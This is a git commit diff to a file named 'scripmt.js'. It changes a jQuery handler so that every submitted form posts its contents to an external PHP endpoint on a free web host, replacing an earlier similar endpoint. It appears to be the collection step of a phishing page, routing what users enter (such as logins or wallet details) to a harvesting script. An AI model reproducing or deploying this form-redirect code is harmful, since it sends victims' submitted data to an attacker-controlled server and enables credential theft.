8d273f7a4c67b40848ca64a8d238355d0406a939
kakekn90 <146025831+kakekn90@users.noreply.github.com>
2023-10-06 02:02:28 +0700

    Update scripmt.js

--- scripmt.js
+++ scripmt.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://gilowaang.antah-layuang.my.id/NFT/tumbuang.php?q=fgf&rlz=1C1CHWL_enID101");
+  $(myform).attr("action", "https://sanakmemangmirippantek.000webhostapp.com/epek.php?q=fgf&rlz=1C1CHWL_enID101");
 });
